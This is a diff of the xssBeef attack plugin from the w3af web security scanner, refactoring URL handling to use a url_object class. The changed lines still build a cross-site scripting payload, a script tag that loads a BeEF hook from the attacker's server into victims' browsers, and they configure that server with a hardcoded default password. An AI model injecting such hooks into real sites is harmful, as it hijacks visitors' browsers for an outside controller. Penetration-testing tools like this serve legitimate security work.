@@ -24,7 +24,7 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 import core.controllers.outputManager as om
 
 from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
-import core.data.parsers.urlParser as urlParser
+from core.data.parsers.urlParser import parse_qs, url_object
 from core.controllers.w3afException import w3afException
 
 import core.data.kb.knowledgeBase as kb
@@ -50,11 +50,11 @@ class xssBeef(baseAttackPlugin):
         # User configured variables
         self._beefPasswd = 'BeEFConfigPass'
         # without the hook dir !
-        self._beefURL = 'http://localhost/beef/'
+        self._beefURL = url_object('http://localhost/beef/')
         
         # A message to the user
         self._message = 'You can start interacting with the beEF server at: '
-        self._message += urlParser.urlJoin( self._beefURL, 'ui/' )
+        self._message += self._beefURL.urlJoin( 'ui/' )
         
     def fastExploit(self, url, method, data ):
         '''
@@ -101,8 +101,9 @@ class xssBeef(baseAttackPlugin):
         #
         # GET http://localhost/beef/submit_config.php?config=http://localhost/beef/&passwd=
         #beEFconfigPass HTTP/1.1
-        config_URL = urlParser.urlJoin( self._beefURL , 'submit_config.php' )
+        config_URL = self._beefURL.urlJoin('submit_config.php' )
         config_URI = config_URL + '?config=' + self._beefURL + '&passwd=' + self._beefPasswd
+        config_URI = url_object( config_URI )
         response = self._urlOpener.GET( config_URI )
         if response.getBody().count('BeEF Successfuly Configured'):
             # everything ok!
@@ -155,7 +156,7 @@ class xssBeef(baseAttackPlugin):
         # Internal note:
         # <script language="Javascript" src="http://localhost/beef/hook/beefmagic.js.php"></script>
         to_include = '<script language="Javascript" src="' 
-        to_include += urlParser.urlJoin( self._beefURL, 'hook/beefmagic.js.php' ) + '"></script>'
+        to_include += self._beefURL.urlJoin( 'hook/beefmagic.js.php' ) + '"></script>'
         
         if 'permanent' in vuln_obj.keys():
             # Its a permanent / persistant XSS, nice ! =)
